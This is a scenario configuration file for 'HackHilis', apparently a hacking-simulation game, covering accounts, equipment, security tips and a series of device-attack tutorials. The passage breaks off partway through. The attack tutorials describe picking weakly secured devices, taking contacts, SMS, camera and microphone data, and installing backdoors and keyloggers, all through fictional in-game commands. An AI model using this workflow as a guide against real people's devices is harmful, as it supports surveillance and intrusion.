/**
 * Comprehensive Scenario Configuration for HackHilis
 * Covers all features and actions in the application
 */

export const scenarios = {
  // ============ AUTHENTICATION TUTORIALS ============
  authentication: {
    tutorial_create_account: {
      id: 'auth_tutorial_create',
      name: 'Tutorial: Create Your Account',
      description: 'Learn how to create and secure your HackHilis account. Step-by-step guide to account setup.',
      category: 'authentication',
      instructions: [
        'STEP 1 - Account Creation:',
        '  1. Navigate to the login page',
        '  2. Click "Create Account" or "Sign Up"',
        '  3. Enter a unique username',
        '  4. Enter a secure email address',
        '  5. Create a strong password',
        '',
        'STEP 2 - Security Best Practices:',
        '  • Use a unique password (not used elsewhere)',
        '  • Include uppercase, lowercase, numbers, and symbols',
        '  • Minimum 8 characters recommended',
        '  • Consider using a password manager',
        '',
        'STEP 3 - Account Verification:',
        '  6. Verify your email if required',
        '  7. Complete any security questions',
        '  8. Set up two-factor authentication if available',
        '',
        'Expected Result: Account created successfully, logged in automatically'
      ],
      actions: []
    },
    tutorial_secure_login: {
      id: 'auth_tutorial_secure_login',
      name: 'Tutorial: Secure Login Practices',
      description: 'Learn how to login securely and protect your account from unauthorized access.',
      category: 'authentication',
      instructions: [
        'STEP 1 - Secure Login:',
        '  1. Always use the official login page',
        '  2. Check for HTTPS in the URL',
        '  3. Never share your credentials',
        '  4. Use strong, unique passwords',
        '',
        'STEP 2 - Recognize Phishing:',
        '  • Check the URL carefully',
        '  • Look for spelling mistakes',
        '  • Verify SSL certificate',
        '  • Be wary of urgent login requests',
        '',
        'STEP 3 - Account Protection:',
        '  • Enable two-factor authentication',
        '  • Monitor login activity',
        '  • Log out from shared devices',
        '  • Use password managers',
        '',
        'STEP 4 - If Compromised:',
        '  • Change password immediately',
        '  • Check for unauthorized activity',
        '  • Enable additional security',
        '  • Contact support if needed',
        '',
        'Tip: Always verify you\'re on the correct website before entering credentials!'
      ],
      actions: []
    },
    login: {
      id: 'auth_login',
      name: 'User Login',
      description: 'User logs into the application',
      category: 'authentication',
      actions: [
        {
          type: 'SET_USER',
          payload: {
            username: 'testuser',
            email: 'test@hackhilis.com'
          }
        }
      ]
    },
    logout: {
      id: 'auth_logout',
      name: 'User Logout',
      description: 'User logs out of the application',
      category: 'authentication',
      actions: [
        {
          type: 'SET_USER',
          payload: null
        }
      ]
    }
  },

  // ============ DASHBOARD TUTORIALS ============
  dashboard: {
    tutorial_navigate_dashboard: {
      id: 'dashboard_tutorial_navigate',
      name: 'Tutorial: Navigate the Dashboard',
      description: 'Learn how to use the main dashboard, view your stats, and access all features.',
      category: 'dashboard',
      instructions: [
        'STEP 1 - Understanding the Dashboard:',
        '  1. The dashboard shows your main stats at the top',
        '  2. Money, Level, Reputation, and Successful Hacks are displayed',
        '  3. Quick action buttons for common tasks',
        '',
        'STEP 2 - Viewing Statistics:',
        '  • Money: Your current funds',
        '  • Level: Your current player level',
        '  • Reputation: Your standing in the community',
        '  • Successful Hacks: Number of successful attacks',
        '',
        'STEP 3 - Skill Progress:',
        '  • View all your skill levels',
        '  • See progress bars for each skill',
        '  • Identify skills that need improvement',
        '',
        'STEP 4 - Quick Actions:',
        '  • Start Hacking: Access hacking interface',
        '  • Join Alliance: Connect with other players',
        '  • View Profile: See detailed stats',
        '',
        'Tip: Check your dashboard regularly to track your progress!'
      ],
      actions: []
    },
    tutorial_manage_resources: {
      id: 'dashboard_tutorial_resources',
      name: 'Tutorial: Manage Your Resources',
      description: 'Learn how to effectively manage money, skills, and equipment from the dashboard.',
      category: 'dashboard',
      instructions: [
        'STEP 1 - Money Management:',
        '  1. View your current balance on dashboard',
        '  2. Earn money through successful hacks',
        '  3. Spend money on equipment and upgrades',
        '  4. Plan purchases based on your goals',
        '',
        'STEP 2 - Skill Development:',
        '  • View skill levels on dashboard',
        '  • Take courses to improve skills',
        '  • Higher skills = Better success rates',
        '  • Focus on skills relevant to your playstyle',
        '',
        'STEP 3 - Equipment Management:',
        '  • Check owned equipment',
        '  • Upgrade when you have funds',
        '  • Better equipment = Better performance',
        '',
        'STEP 4 - Strategic Planning:',
        '  • Set goals based on resources',
        '  • Prioritize skill development',
        '  • Save money for important purchases',
        '  • Track progress over time',
        '',
        'Tip: Balance skill development with equipment purchases for optimal progress!'
      ],
      actions: []
    },
    viewDashboard: {
      id: 'dashboard_view',
      name: 'View Dashboard',
      description: 'View main dashboard with stats and quick actions',
      category: 'dashboard',
      actions: []
    },
    viewStats: {
      id: 'dashboard_stats',
      name: 'View Statistics',
      description: 'View player statistics (money, level, reputation)',
      category: 'dashboard',
      actions: []
    },
    viewSkills: {
      id: 'dashboard_skills',
      name: 'View Skills',
      description: 'View all skill levels',
      category: 'dashboard',
      actions: []
    }
  },

  // ============ PHONE TUTORIALS ============
  phone: {
    tutorial_phone_basics: {
      id: 'phone_tutorial_basics',
      name: 'Tutorial: Phone Basics & Navigation',
      description: 'Learn how to use your phone, navigate apps, and access all phone features.',
      category: 'phone',
      instructions: [
        'STEP 1 - Accessing Your Phone:',
        '  1. Navigate to Phone page from sidebar',
        '  2. If you don\'t own a phone, purchase one from Store',
        '  3. Phone will appear with home screen',
        '',
        'STEP 2 - Phone Apps:',
        '  • Wallet: View your money',
        '  • Messages: Send/receive SMS',
        '  • Email: Check your inbox',
        '  • Browser: Browse the web',
        '  • Contacts: Manage contacts',
        '  • Phone: Make calls and dial numbers',
        '',
        'STEP 3 - Using Apps:',
        '  4. Tap any app icon to open',
        '  5. Use back button to return home',
        '  6. Swipe between screens if available',
        '',
        'STEP 4 - Phone Features:',
        '  • Status bar shows time, battery, signal',
        '  • Home indicator at bottom',
        '  • All apps accessible from home screen',
        '',
        'Tip: Your phone is your main tool - learn all its features!'
      ],
      actions: []
    },
    tutorial_phone_security: {
      id: 'phone_tutorial_security',
      name: 'Tutorial: Secure Your Phone',
      description: 'Learn how to protect your phone from attacks and secure your data.',
      category: 'phone',
      instructions: [
        'STEP 1 - Basic Security:',
        '  1. Set a strong PIN/password',
        '  2. Enable biometric authentication if available',
        '  3. Keep your phone updated',
        '  4. Use secure lock screen',
        '',
        'STEP 2 - App Security:',
        '  • Review app permissions',
        '  • Only install from trusted sources',
        '  • Keep apps updated',
        '  • Uninstall unused apps',
        '',
        'STEP 3 - Data Protection:',
        '  • Enable encryption',
        '  • Use secure backup',
        '  • Be careful with public WiFi',
        '  • Use VPN when possible',
        '',
        'STEP 4 - Attack Prevention:',
        '  • Don\'t click suspicious links',
        '  • Be wary of unknown contacts',
        '  • Monitor for unusual activity',
        '  • Report suspicious behavior',
        '',
        'STEP 5 - If Compromised:',
        '  • Change all passwords immediately',
        '  • Enable additional security',
        '  • Check for unauthorized access',
        '  • Consider factory reset if severe',
        '',
        'Tip: Higher security level phones are harder to attack!'
      ],
      actions: []
    },
    tutorial_phone_terminal: {
      id: 'phone_tutorial_terminal',
      name: 'Tutorial: Using Phone Terminal',
      description: 'Learn how to use the Android Development Terminal to interact with your phone and other devices.',
      category: 'phone',
      instructions: [
        'STEP 1 - Accessing Terminal:',
        '  1. Navigate to Phone page',
        '  2. Terminal appears next to your phone',
        '  3. Terminal is always available',
        '',
        'STEP 2 - Basic Commands:',
        '  • help - Show all available commands',
        '  • adb devices - List connected devices',
        '  • adb shell - Enter Android shell',
        '  • phone info - Get phone information',
        '',
        'STEP 3 - Phone Access Commands:',
        '  • phone contacts - List all contacts',
        '  • phone messages - View SMS',
        '  • phone photos - Access gallery',
        '  • phone files - Browse file system',
        '',
        'STEP 4 - OS Management:',
        '  • current-os - Check OS version',
        '  • switch-os <version> - Change OS',
        '  • os-features - View OS features',
        '',
        'STEP 5 - Advanced Usage:',
        '  • Use adb shell for deeper access',
        '  • Navigate Android filesystem',
        '  • Access /sdcard, /data/data, etc.',
        '',
        'Tip: Type "help" in terminal to see all commands!'
      ],
      actions: []
    },
    purchaseBasicPhone: {
      id: 'phone_purchase_basic',
      name: 'Purchase Basic Phone',
      description: 'Purchase a basic phone from the store',
      category: 'phone',
      actions: [
        {
          type: 'UPDATE_MONEY',
          payload: -500
        },
        {
          type: 'PURCHASE_PHONE',
          payload: {
            model: 'Basic Phone',
            securityLevel: 3
          }
        }
      ]
    },
    purchaseIPhonePro: {
      id: 'phone_purchase_pro',
      name: 'Purchase iPhone Pro',
      description: 'Purchase an iPhone Pro from the store',
      category: 'phone',
      actions: [
        {
          type: 'UPDATE_MONEY',
          payload: -1200
        },
        {
          type: 'PURCHASE_PHONE',
          payload: {
            model: 'iPhone Pro',
            securityLevel: 8
          }
        }
      ]
    },
    viewWallet: {
      id: 'phone_wallet',
      name: 'View Phone Wallet',
      description: 'Open wallet app on phone to view money',
      category: 'phone',
      actions: []
    },
    viewMessages: {
      id: 'phone_messages',
      name: 'View Messages',
      description: 'Open messages app on phone',
      category: 'phone',
      actions: []
    },
    viewEmail: {
      id: 'phone_email',
      name: 'View Email',
      description: 'Open email app on phone',
      category: 'phone',
      actions: []
    },
    viewBrowser: {
      id: 'phone_browser',
      name: 'View Browser',
      description: 'Open browser app on phone',
      category: 'phone',
      actions: []
    },
    viewContacts: {
      id: 'phone_contacts',
      name: 'View Contacts',
      description: 'Open contacts app on phone',
      category: 'phone',
      actions: []
    },
    chargePhone: {
      id: 'phone_charge',
      name: 'Charge Phone',
      description: 'Charge phone battery to 100%',
      category: 'phone',
      actions: [
        {
          type: 'UPDATE_PHONE_BATTERY',
          payload: 100
        }
      ]
    },
    receiveMessage: {
      id: 'phone_receive_message',
      name: 'Receive Message',
      description: 'Receive a new message on phone',
      category: 'phone',
      actions: [
        {
          type: 'ADD_MESSAGE',
          payload: {
            id: Date.now(),
            sender: 'Unknown',
            content: 'Test message',
            time: new Date().toLocaleTimeString()
          }
        }
      ]
    },
    receiveEmail: {
      id: 'phone_receive_email',
      name: 'Receive Email',
      description: 'Receive a new email on phone',
      category: 'phone',
      actions: [
        {
          type: 'ADD_EMAIL',
          payload: {
            id: Date.now(),
            sender: 'Test Sender',
            subject: 'Test Email',
            preview: 'This is a test email',
            time: new Date().toLocaleTimeString()
          }
        }
      ]
    },
    addContact: {
      id: 'phone_add_contact',
      name: 'Add Contact',
      description: 'Add a new contact to phone',
      category: 'phone',
      actions: [
        {
          type: 'ADD_CONTACT',
          payload: {
            id: Date.now(),
            name: 'Test Contact',
            number: '555-0123'
          }
        }
      ]
    }
  },

  // ============ STORE SCENARIOS ============
  store: {
    purchaseBasicLaptop: {
      id: 'store_purchase_basic_laptop',
      name: 'Purchase Basic Laptop',
      description: 'Purchase a basic laptop from the store',
      category: 'store',
      actions: [
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'laptop',
            item: {
              name: 'Basic Laptop',
              price: 1000,
              stats: { hacking: 5, speed: 3 }
            }
          }
        }
      ]
    },
    purchaseGamingLaptop: {
      id: 'store_purchase_gaming_laptop',
      name: 'Purchase Gaming Laptop',
      description: 'Purchase a gaming laptop from the store',
      category: 'store',
      actions: [
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'laptop',
            item: {
              name: 'Gaming Laptop',
              price: 2500,
              stats: { hacking: 15, speed: 8 }
            }
          }
        }
      ]
    },
    purchaseBasicRouter: {
      id: 'store_purchase_basic_router',
      name: 'Purchase Basic Router',
      description: 'Purchase a basic router from the store',
      category: 'store',
      actions: [
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'router',
            item: {
              name: 'Basic Router',
              price: 500,
              stats: { networking: 5, range: 3 }
            }
          }
        }
      ]
    },
    purchaseVPN: {
      id: 'store_purchase_vpn',
      name: 'Purchase VPN Service',
      description: 'Purchase VPN service from the store',
      category: 'store',
      actions: [
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'vpn',
            item: {
              name: 'VPN Service',
              price: 300,
              stats: { security: 10, anonymity: 8 }
            }
          }
        }
      ]
    },
    purchaseHackingToolkit: {
      id: 'store_purchase_toolkit',
      name: 'Purchase Hacking Toolkit',
      description: 'Purchase hacking toolkit from the store',
      category: 'store',
      actions: [
        {
          type: 'ADD_ITEM',
          payload: {
            name: 'Hacking Toolkit',
            price: 1500,
            stats: { hacking: 10, tools: 5 }
          }
        }
      ]
    },
    purchaseUsedLaptop: {
      id: 'store_purchase_used_laptop',
      name: 'Purchase Used Laptop',
      description: 'Purchase a used laptop (medium risk)',
      category: 'store',
      actions: [
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'laptop',
            item: {
              name: 'Used Gaming Laptop',
              price: 1200,
              risk: 'medium',
              condition: 'Good',
              stats: { hacking: 12, speed: 6 }
            }
          }
        }
      ]
    },
    purchaseBlackMarketLaptop: {
      id: 'store_purchase_blackmarket',
      name: 'Purchase Black Market Laptop',
      description: 'Purchase a stolen laptop from black market (extreme risk)',
      category: 'store',
      actions: [
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'laptop',
            item: {
              name: 'Stolen Gaming Laptop',
              price: 800,
              risk: 'extreme',
              illegal: true,
              condition: 'Unknown',
              stats: { hacking: 15, speed: 8 }
            }
          }
        }
      ]
    }
  },

  // ============ GADGETS TUTORIALS ============
  gadgets: {
    tutorial_manage_gadgets: {
      id: 'gadgets_tutorial_manage',
      name: 'Tutorial: Manage Your Gadgets',
      description: 'Learn how to power on/off devices, configure settings, and manage your equipment.',
      category: 'gadgets',
      instructions: [
        'STEP 1 - Accessing Gadgets:',
        '  1. Navigate to Gadgets page from sidebar',
        '  2. View all your owned equipment',
        '  3. See device status and battery',
        '',
        'STEP 2 - Power Management:',
        '  • Click power button to turn on/off',
        '  • Powered devices consume battery',
        '  • Turn off when not in use',
        '  • Monitor battery levels',
        '',
        'STEP 3 - Device Configuration:',
        '  • Click configure button on device',
        '  • Adjust settings as needed',
        '  • Save configuration',
        '  • Test changes',
        '',
        'STEP 4 - Router Setup:',
        '  • Configure SSID (network name)',
        '  • Set secure password',
        '  • Enable encryption',
        '  • Connect devices to router',
        '',
        'STEP 5 - Internet Connectivity:',
        '  • Connect laptop to router',
        '  • Or connect to internet provider',
        '  • Monitor connection status',
        '  • Disconnect when needed',
        '',
        'Tip: Keep devices powered off when not in use to save battery!'
      ],
      actions: []
    },
    tutorial_router_security: {
      id: 'gadgets_tutorial_router_security',
      name: 'Tutorial: Secure Your Router',
      description: 'Learn how to configure your router securely to prevent unauthorized access.',
      category: 'gadgets',
      instructions: [
        'STEP 1 - Router Configuration:',
        '  1. Access router settings',
        '  2. Change default SSID',
        '  3. Set strong WiFi password',
        '  4. Enable WPA3 encryption',
        '',
        'STEP 2 - Admin Access:',
        '  • Change default admin password',
        '  • Use strong, unique password',
        '  • Enable admin access restrictions',
        '  • Disable remote management if not needed',
        '',
        'STEP 3 - Network Security:',
        '  • Enable firewall',
        '  • Disable WPS (vulnerable)',
        '  • Hide SSID if desired',
        '  • Use MAC address filtering',
        '',
        'STEP 4 - Firmware Updates:',
        '  • Keep router firmware updated',
        '  • Check for security patches',
        '  • Enable auto-updates if available',
        '',
        'STEP 5 - Monitoring:',
        '  • Check connected devices regularly',
        '  • Monitor for suspicious activity',
        '  • Review router logs',
        '  • Change password periodically',
        '',
        'Tip: A secure router protects all devices on your network!'
      ],
      actions: []
    },
    powerOnLaptop: {
      id: 'gadgets_power_laptop',
      name: 'Power On Laptop',
      description: 'Power on the laptop device',
      category: 'gadgets',
      actions: [
        {
          type: 'POWER_DEVICE',
          payload: {
            device: 'laptop',
            powered: true
          }
        }
      ]
    },
    powerOffLaptop: {
      id: 'gadgets_power_off_laptop',
      name: 'Power Off Laptop',
      description: 'Power off the laptop device',
      category: 'gadgets',
      actions: [
        {
          type: 'POWER_DEVICE',
          payload: {
            device: 'laptop',
            powered: false
          }
        }
      ]
    },
    powerOnRouter: {
      id: 'gadgets_power_router',
      name: 'Power On Router',
      description: 'Power on the router device',
      category: 'gadgets',
      actions: [
        {
          type: 'POWER_DEVICE',
          payload: {
            device: 'router',
            powered: true
          }
        }
      ]
    },
    configureRouter: {
      id: 'gadgets_configure_router',
      name: 'Configure Router',
      description: 'Configure router SSID and password',
      category: 'gadgets',
      actions: [
        {
          type: 'CONFIGURE_ROUTER',
          payload: {
            ssid: 'HackHilis_Network',
            password: 'SecurePass123'
          }
        }
      ]
    },
    connectLaptopToRouter: {
      id: 'gadgets_connect_laptop_router',
      name: 'Connect Laptop to Router',
      description: 'Connect laptop to router for internet access',
      category: 'gadgets',
      actions: [
        {
          type: 'CONNECT_INTERNET',
          payload: {
            device: 'laptop',
            type: 'router',
            provider: 'Local Router',
            cost: 0
          }
        }
      ]
    },
    connectLaptopToProvider: {
      id: 'gadgets_connect_laptop_provider',
      name: 'Connect Laptop to Internet Provider',
      description: 'Connect laptop directly to internet provider',
      category: 'gadgets',
      actions: [
        {
          type: 'CONNECT_INTERNET',
          payload: {
            device: 'laptop',
            type: 'provider',
            provider: 'CyberNet ISP',
            cost: 50
          }
        }
      ]
    },
    disconnectInternet: {
      id: 'gadgets_disconnect',
      name: 'Disconnect Internet',
      description: 'Disconnect device from internet',
      category: 'gadgets',
      actions: [
        {
          type: 'DISCONNECT_INTERNET',
          payload: {
            device: 'laptop'
          }
        }
      ]
    }
  },

  // ============ LAPTOP SCENARIOS ============
  laptop: {
    createLaptopAccount: {
      id: 'laptop_create_account',
      name: 'Create Laptop Account',
      description: 'Create a user account on the laptop',
      category: 'laptop',
      actions: [
        {
          type: 'CREATE_LAPTOP_ACCOUNT',
          payload: {
            username: 'hacker',
            password: 'password123'
          }
        }
      ]
    },
    loginToLaptop: {
      id: 'laptop_login',
      name: 'Login to Laptop',
      description: 'Login to laptop with credentials',
      category: 'laptop',
      actions: [
        {
          type: 'LOGIN_LAPTOP',
          payload: {
            success: true
          }
        }
      ]
    },
    logoutFromLaptop: {
      id: 'laptop_logout',
      name: 'Logout from Laptop',
      description: 'Logout from laptop',
      category: 'laptop',
      actions: [
        {
          type: 'LOGOUT_LAPTOP'
        }
      ]
    },
    useLaptop: {
      id: 'laptop_use',
      name: 'Use Laptop',
      description: 'Use laptop (drains battery)',
      category: 'laptop',
      actions: [
        {
          type: 'USE_DEVICE',
          payload: {
            device: 'laptop',
            batteryDrain: 5
          }
        }
      ]
    }
  },

  // ============ COMPANIES TUTORIALS ============
  companies: {
    tutorial_company_research: {
      id: 'companies_tutorial_research',
      name: 'Tutorial: Research Companies',
      description: 'Learn how to research companies, identify targets, and plan attacks.',
      category: 'companies',
      instructions: [
        'STEP 1 - Company Research:',
        '  1. Navigate to Companies page',
        '  2. Browse available companies',
        '  3. Review company information',
        '  4. Check security levels',
        '',
        'STEP 2 - Target Selection:',
        '  • Low security: Easier to hack',
        '  • High value: Better rewards',
        '  • Match your skill level',
        '  • Consider risk vs. reward',
        '',
        'STEP 3 - Reconnaissance:',
        '  • Research company infrastructure',
        '  • Identify entry points',
        '  • Check for known vulnerabilities',
        '  • Plan attack strategy',
        '',
        'STEP 4 - Attack Planning:',
        '  • Choose attack method',
        '  • Gather necessary tools',
        '  • Prepare for different outcomes',
        '  • Have backup plans',
        '',
        'STEP 5 - Execution:',
        '  • Execute planned attack',
        '  • Monitor progress',
        '  • Adapt if needed',
        '  • Extract data if successful',
        '',
        'Tip: Always research your target thoroughly before attacking!'
      ],
      actions: []
    },
    tutorial_legitimate_work: {
      id: 'companies_tutorial_work',
      name: 'Tutorial: Legitimate Work Path',
      description: 'Learn how to apply for jobs and work legitimately at companies.',
      category: 'companies',
      instructions: [
        'STEP 1 - Job Application:',
        '  1. Navigate to Companies page',
        '  2. Browse job openings',
        '  3. Check requirements',
        '  4. Apply for suitable positions',
        '',
        'STEP 2 - Qualifications:',
        '  • Meet skill requirements',
        '  • Have relevant experience',
        '  • Complete necessary courses',
        '  • Build your reputation',
        '',
        'STEP 3 - Benefits of Legitimate Work:',
        '  • Steady income',
        '  • Legal and safe',
        '  • Build reputation',
        '  • Gain experience',
        '',
        'STEP 4 - Career Progression:',
        '  • Start with entry-level jobs',
        '  • Gain experience',
        '  • Apply for better positions',
        '  • Increase your salary',
        '',
        'Tip: Legitimate work provides stable income while you learn hacking skills!'
      ],
      actions: []
    },
    viewCompanies: {
      id: 'companies_view',
      name: 'View Companies',
      description: 'View available companies to hack or work for',
      category: 'companies',
      actions: []
    },
    applyForJob: {
      id: 'companies_apply_job',
      name: 'Apply for Job',
      description: 'Apply for a job at a company',
      category: 'companies',
      actions: [
        {
          type: 'JOIN_COMPANY',
          payload: {
            company: 'TechCorp',
            position: 'Junior Developer',
            salary: 50000
          }
        }
      ]
    },
    hackCompany: {
      id: 'companies_hack',
      name: 'Hack Company',
      description: 'Attempt to hack a company',
      category: 'companies',
      actions: [
        {
          type: 'UPDATE_STATS',
          payload: {
            hacksAttempted: 1
          }
        }
      ]
    }
  },

  // ============ EDUCATION SCENARIOS ============
  education: {
    startCourse: {
      id: 'education_start_course',
      name: 'Start Course',
      description: 'Start an education course',
      category: 'education',
      actions: []
    },
    completeCourse: {
      id: 'education_complete_course',
      name: 'Complete Course',
      description: 'Complete an education course and gain skills',
      category: 'education',
      actions: [
        {
          type: 'COMPLETE_COURSE',
          payload: 1
        },
        {
          type: 'UPDATE_SKILL',
          skill: 'hacking',
          payload: 10
        },
        {
          type: 'ADD_EXPERIENCE',
          payload: 100
        }
      ]
    },
    viewCertifications: {
      id: 'education_view_certs',
      name: 'View Certifications',
      description: 'View earned certifications',
      category: 'education',
      actions: []
    }
  },

  // ============ HACKING SCENARIOS ============
  hacking: {
    viewTargets: {
      id: 'hacking_view_targets',
      name: 'View Hacking Targets',
      description: 'View available hacking targets',
      category: 'hacking',
      actions: []
    },
    quickHackPersonalWebsite: {
      id: 'hacking_quick_personal',
      name: 'Quick Hack - Personal Website',
      description: 'Quick hack attempt on personal website',
      category: 'hacking',
      actions: [
        {
          type: 'UPDATE_STATS',
          payload: {
            hacksAttempted: 1
          }
        }
      ]
    },
    successfulHackPersonalWebsite: {
      id: 'hacking_success_personal',
      name: 'Successful Hack - Personal Website',
      description: 'Successfully hack personal website and steal money',
      category: 'hacking',
      actions: [
        {
          type: 'UPDATE_MONEY',
          payload: 500
        },
        {
          type: 'ADD_EXPERIENCE',
          payload: 10
        },
        {
          type: 'UPDATE_STATS',
          payload: {
            hacksAttempted: 1,
            hacksSuccessful: 1,
            moneyStolen: 500
          }
        }
      ]
    },
    failedHack: {
      id: 'hacking_failed',
      name: 'Failed Hack Attempt',
      description: 'Hack attempt fails and is detected',
      category: 'hacking',
      actions: [
        {
          type: 'UPDATE_STATS',
          payload: {
            hacksAttempted: 1
          }
        }
      ]
    },
    advancedHack: {
      id: 'hacking_advanced',
      name: 'Advanced Hack Attack',
      description: 'Use advanced terminal to hack target',
      category: 'hacking',
      actions: []
    }
  },

  // ============ DEVICE ATTACK SCENARIOS (Educational) ============
  deviceAttacks: {
    tutorial_scan_devices: {
      id: 'attack_tutorial_scan',
      name: 'Tutorial: Scan for Devices',
      description: 'Learn how to discover devices using terminal commands. Start directly with terminal scanning.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Open Terminal:',
        '  • You are now in the terminal interface',
        '  • Your terminal is on the left (Your Device)',
        '  • Target terminal is on the right (when attacking)',
        '',
        'STEP 2 - Bluetooth Scan:',
        '  Command: bt scan',
        '  • Type: bt scan',
        '  • Press Enter',
        '  • Wait for scan to complete (3-5 seconds)',
        '  • System will discover nearby Bluetooth devices',
        '',
        'STEP 3 - List Discovered Devices:',
        '  Command: bt list',
        '  • Type: bt list',
        '  • Press Enter',
        '  • View all discovered Bluetooth devices',
        '  • Note MAC addresses and device names',
        '',
        'STEP 4 - WiFi Scan:',
        '  Command: wifi scan',
        '  • Type: wifi scan',
        '  • Press Enter',
        '  • Scans for WiFi networks and devices',
        '  • Shows network names and connected devices',
        '',
        'STEP 5 - Network Scan:',
        '  Command: nmcli device wifi list',
        '  • Type: nmcli device wifi list',
        '  • Press Enter',
        '  • Lists all WiFi networks',
        '  • Shows signal strength and security',
        '',
        'STEP 6 - Review Results:',
        '  • Check device security levels (1-10)',
        '  • Lower security = Easier to attack',
        '  • Note MAC addresses for Bluetooth attacks',
        '  • Note IP addresses for network attacks',
        '',
        'Tip: Use multiple scan methods to find all available targets!'
      ],
      actions: []
    },
    tutorial_identify_weak_device: {
      id: 'attack_tutorial_identify',
      name: 'Tutorial: Identify Weak Devices',
      description: 'Learn how to identify vulnerable devices using terminal commands and device information.',
      category: 'deviceAttacks',
      instructions: [
        'STEP 1 - Scan for Devices:',
        '  Command: bt scan',
        '  • Type: bt scan',
        '  • Wait for completion',
        '  Command: bt list',
        '  • Type: bt list',
        '  • Review discovered devices',
        '',
        'STEP 2 - Check Security Levels:',
        '  • Security 1-3: Very Easy (80-90% success)',
        '  • Security 4-5: Easy (60-80% success)',
        '  • Security 6-7: Medium (40-60% success)',
        '  • Security 8-10: Hard (10-40% success)',
        '  • Lower security = Better target',
        '',
        'STEP 3 - Check OS Versions:',
        '  • Android 9-11 (API 28-30): Easier to exploit',
        '  • Android 12+ (API 31+): Harder to exploit',
        '  • Older OS = More vulnerabilities',
        '  • Check device info in scan results',
        '',
        'STEP 4 - Identify Vulnerable Status:',
        '  • Look for "Vulnerable" status in output',
        '  • Check for "Online" vs "Offline"',
        '  • Vulnerable devices are easier targets',
        '',
        'STEP 5 - Connection Method:',
        '  • Bluetooth: Often easier, nearby only',
        '  • WiFi: Network-based, can be remote',
        '  • Direct: Requires physical access',
        '',
        'STEP 6 - Select Best Target:',
        '  • Choose device with Security 1-5',
        '  • Prefer Android 9-11 if available',
        '  • Note MAC address (for Bluetooth)',
        '  • Note IP address (for network)',
        '',
        'Tip: Always target the weakest device first for learning!'
      ],
      actions: []
    },
    tutorial_bluetooth_attack: {
      id: 'attack_tutorial_bluetooth',
      name: 'Tutorial: Bluetooth Attack Method',
      description: 'Learn step-by-step Bluetooth device exploitation. Best for nearby devices with Bluetooth enabled.',
      category: 'deviceAttacks',
      instructions: [
        '1. Scan for Bluetooth devices: Click "Scan Bluetooth"',
        '2. Select a device with low security (1-5)',
        '3. Click "Terminal Only" or "Attack Device"',
        '4. In YOUR terminal (left side), type: bt scan',
        '5. List devices: bt list',
        '6. Attempt exploit: bt exploit <MAC_ADDRESS>',
        '7. If successful, device will show "COMPROMISED" status',
        '8. Then use target terminal to extract data'
      ],
      actions: []
    },
    tutorial_network_ip_attack: {
      id: 'attack_tutorial_network',
      name: 'Tutorial: Network IP Attack Method',
      description: 'Learn how to attack devices via network/IP address. Best for devices on same network.',
      category: 'deviceAttacks',
      instructions: [
        '1. Scan for network devices: Click "Scan Network" or "Scan WiFi"',
        '2. Note the device IP address (e.g., 192.168.1.105)',
        '3. Select device and click "Terminal Only"',
        '4. In YOUR terminal, type: hack-device <IP_ADDRESS>',
        '5. System will scan for vulnerabilities automatically',
        '6. If vulnerabilities found, exploit will attempt automatically',
        '7. Check target device status for "COMPROMISED"',
        '8. Success rate: 60-80% on medium security devices'
      ],
      actions: []
    },
    tutorial_direct_exploit: {
      id: 'attack_tutorial_direct',
      name: 'Tutorial: Direct Shell Exploit',
      description: 'Learn direct exploitation method. Gain shell access to target device terminal.',
      category: 'deviceAttacks',
      instructions: [
        '1. Select target device and click "Terminal Only"',
        '2. In TARGET terminal (right side), type: exploit shell',
        '3. Wait 2-3 seconds for exploit to execute',
        '4. Success depends on device security level:',
        '   - Security 1-3: 80-90% success',
        '   - Security 4-6: 50-70% success',
        '   - Security 7-8: 30-50% success',
        '   - Security 9-10: 10-30% success',
        '5. If successful, device shows "COMPROMISED"',
        '6. You now have shell access to device'
      ],
      actions: []
    },
    tutorial_data_extraction: {
      id: 'attack_tutorial_extract',
      name: 'Tutorial: Extract Data from Compromised Device',
      description: 'Learn how to extract data after gaining access. Use exploit commands in target terminal.',
      category: 'deviceAttacks',
      instructions: [
        '1. First gain access using exploit shell or other methods',
        '2. Wait for device to show "COMPROMISED" status',
        '3. In TARGET terminal, use these commands:',
        '   - exploit contacts    (Extract all contacts)',
        '   - exploit photos     (Download all photos)',
        '   - exploit files      (Access file system)',
        '   - exploit sms        (Intercept SMS messages)',
        '   - exploit location   (Track GPS location)',
        '   - exploit camera     (Access camera remotely)',
        '   - exploit mic        (Access microphone)',
        '4. Each command extracts different data',
        '5. Success rate: 70-90% after device is compromised'
      ],
      actions: []
    },
    tutorial_persistence: {
      id: 'attack_tutorial_persistence',
      name: 'Tutorial: Install Persistent Backdoor',
      description: 'Learn how to maintain access after initial compromise. Install backdoor for persistent access.',
      category: 'deviceAttacks',
      instructions: [
        '1. First gain shell access: exploit shell',
        '2. Wait for device to be compromised',
        '3. In TARGET terminal, type: exploit backdoor',
        '4. This installs persistent access',
        '5. Device will remain accessible even after reboot',
        '6. You can also install keylogger: exploit keylogger',
        '7. Keylogger captures all keystrokes on device',
        '8. Success rate: 40-60% depending on security level'
      ],
      actions: []
    },
    tutorial_pin_cracking: {
      id: 'attack_tutorial_pin',
      name: 'Tutorial: PIN/Password Cracking',
      description: 'Learn brute force PIN cracking method. Useful for locked devices.',
      category: 'deviceAttacks',
      instructions: [
        '1. Select target device (can be locked)',
        '2. Click "Terminal Only"',
        '3. In TARGET terminal, type: crack-pin',
        '4. System will attempt brute force attack',
        '5. May take time (shows progress)',
        '6. Success rate: ~30% (device may lock after attempts)',
        '7. Works better on devices with weak PIN policies',
        '8. If successful, device unlocks automatically'
      ],
      actions: []
    },
    tutorial_multi_stage_attack: {
      id: 'attack_tutorial_multistage',
      name: 'Tutorial: Multi-Stage Attack (Advanced)',
      description: 'Learn advanced multi-stage attack combining multiple methods. Best for high-security devices.',
      category: 'deviceAttacks',
      instructions: [
        'STAGE 1 - Reconnaissance:',
        '  1. Scan all devices: Click "Scan All"',
        '  2. Identify target with security 7-10',
        '  3. Note device info: OS, IP, MAC, security level',
        '',
